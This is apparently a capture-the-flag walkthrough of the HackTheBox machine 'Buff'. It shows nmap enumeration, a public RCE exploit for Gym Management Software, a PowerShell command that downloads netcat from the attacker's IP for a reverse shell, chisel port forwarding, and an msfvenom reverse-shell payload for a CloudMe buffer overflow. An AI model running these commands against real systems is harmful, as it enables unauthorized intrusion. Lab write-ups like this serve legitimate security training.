## **Description**

Hello hackers, I hope you are doing well. We are doing [Buff](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com). This is an easy machine box with a vulnerable management system that we exploit to get foothold. Once in we find another vulnerable service listening on a local port so we use port forwarding to be able to access the service and exploit it to get root.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.198
Host is up (0.45s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
```

There is only on open port and it is 8080 running n Apache http web server.


### Web

Let's navigate to the webpage.

Here we have a website about fitness, let's check the tabs at the top.

![](2.png)

On the contact page, we see the the website uses `Gym Management Software 1.0`.

Searching for this management software we find it is vulnerable to an [Unauthenticated Remote Code Execution](https://www.exploit-db.com/exploits/48506)

## **Foothold**

Let's download the exploit and use it.

![](3.png)

We got command execution, but the shell is not interactive and we can't change directories.

Let's upload copy of netcat and get a reverse shell.

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.17.90/ncat.exe','nc.exe')"
```

![](5.png)

Great! Let's move on.


## **Privilege Escalation**

Checking shaun's home directories we find the following

![](6.png)

There is a `CloudMe_1112.exe` executable in the Downloads directory.

Also checking listening port with `netstat -an` we see a port listening at 8888 which is CloudMe.

![](7.png)

Let's do a port forward using chisel.

On our local machine, we set up a chisel server with the following command:

```bash
./chisel server --reverse --port 9002
```

After uploading a copy of chisel to the target, we connect to the server with the following command:

```bash
.\chisel.exe client 10.10.10.10:9002 R:8888:localhost:8888
```

![](9.png)

The version of CloudMe(1.11.2) is vulnerable to a [Buffer Overflow](https://www.exploit-db.com/exploits/48389) that we can exploit to get command execution.

![](8.png)

Let's download the exploit and edit it.

The first thing we should do is generate a stageless reverse shell payload using msfvenom.

```bash
└──╼ $ msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.17.90 LPORT=9999 -b '\x00\x0A\x0D' -f python -v payload                                 130 ⨯

payload += b"\xf8\x55\x24\x76\x90\x33\x4a\x25\x91\x11"
```

We copy this newly generated payload and replace the one in the exploit with it.

After that we setup a listener and run the exploit.
